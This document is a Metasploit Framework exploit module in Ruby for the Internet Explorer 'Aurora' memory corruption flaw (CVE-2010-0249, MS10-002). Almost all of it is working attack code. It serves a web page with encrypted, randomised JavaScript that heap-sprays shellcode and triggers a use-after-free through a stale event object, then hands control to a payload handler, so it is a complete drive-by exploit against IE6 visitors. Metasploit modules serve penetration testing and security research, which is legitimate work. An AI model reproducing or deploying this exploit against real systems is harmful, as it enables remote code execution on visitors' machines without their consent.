##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	#
	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "6.0",
	#	:ua_maxver  => "6.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => nil, # no way to test without just trying it
	#})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer "Aurora" Memory Corruption',
			'Description'    => %q{
					This module exploits a memory corruption flaw in Internet Explorer. This
				flaw was found in the wild and was a key component of the "Operation Aurora"
				attacks that lead to the compromise of a number of high profile companies. The
				exploit code is a direct port of the public sample published to the Wepawet
				malware analysis site. The technique used by this module is currently identical
				to the public sample, as such, only Internet Explorer 6 can be reliably exploited.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',
					'hdm'      # Metasploit port
				],
			'References'     =>
				[
					['MSB', 'MS10-002'],
					['CVE', '2010-0249'],
					['OSVDB', '61697'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/979352.mspx'],
					['URL', 'http://wepawet.iseclab.org/view.php?hash=1aea206aa64ebeabb07237f1e2230d0f&type=js']

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Jan 14 2010', # wepawet sample
			'DefaultTarget'  => 0))

		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
	end

	def on_request_uri(cli, request)

		if (request.uri.match(/\.gif/i))
			data = "R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==".unpack("m*")[0]
			send_response(cli, data, { 'Content-Type' => 'image/gif' })
			return
		end

		if (!request.uri.match(/\?\w+/))
			send_local_redirect(cli, "?#{@javascript_encode_key}")
			return
		end

		var_boom       = rand_text_alpha(rand(100) + 1)

		var_element    = rand_text_alpha(rand(100) + 1)
		var_event      = rand_text_alpha(rand(100) + 1)
		var_loaded     = rand_text_alpha(rand(100) + 1)
		var_loaded_arg = rand_text_alpha(rand(100) + 1)

		var_memory     = rand_text_alpha(rand(100) + 1)
		var_spray      = rand_text_alpha(rand(100) + 1)
		var_i          = rand_text_alpha(rand(100) + 1)

		var_el_array   = rand_text_alpha(rand(100) + 1)
		bleh           = rand_text_alpha(3);
		var_grab_mem   = rand_text_alpha(rand(100) + 1)

		var_unescape   = rand_text_alpha(rand(100) + 1)
		var_shellcode  = rand_text_alpha(rand(100) + 1)

		var_span_id    = rand_text_alpha(rand(100) + 1)
		var_start      = rand_text_alpha(rand(100) + 1)
		rand_html      = rand_text_english(rand(400) + 500)

		js = <<-EOS
var #{var_element} = "COMMENT";
var #{var_el_array} = new Array();
for (i = 0; i < 1300; i++)
{
#{var_el_array}[i] = document.createElement(#{var_element});
#{var_el_array}[i].data = "#{bleh}";
}
var #{var_event} = null;
var #{var_memory} = new Array();
var #{var_unescape} = unescape;
function #{var_boom}()
{
var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "d" + "%u" + "0" + "c" + "0" + "d" );
do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );
for (#{var_i} = 0; #{var_i} < 150; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};
}
function #{var_loaded}(#{var_loaded_arg})
{
#{var_boom}();
#{var_event} = document.createEventObject(#{var_loaded_arg});
document.getElementById("#{var_span_id}").innerHTML = "";
window.setInterval(#{var_grab_mem}, 50);
}
function #{var_grab_mem}()
{
p = "\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d";
for (i = 0; i < #{var_el_array}.length; i++)
{
#{var_el_array}[i].data = p;
}
var t = #{var_event}.srcElement;
}
EOS
		js_encoded = encrypt_js(js, @javascript_encode_key)

		html = %Q|<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
<script>
#{js_encoded}
</script>
</head>
<body>
<span id="#{var_span_id}"><iframe src="#{get_resource}#{var_start}.gif" onload="#{var_loaded}(event)" /></span></body></html>
</body>
</html>|

		print_status("Sending #{self.name}")
		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end
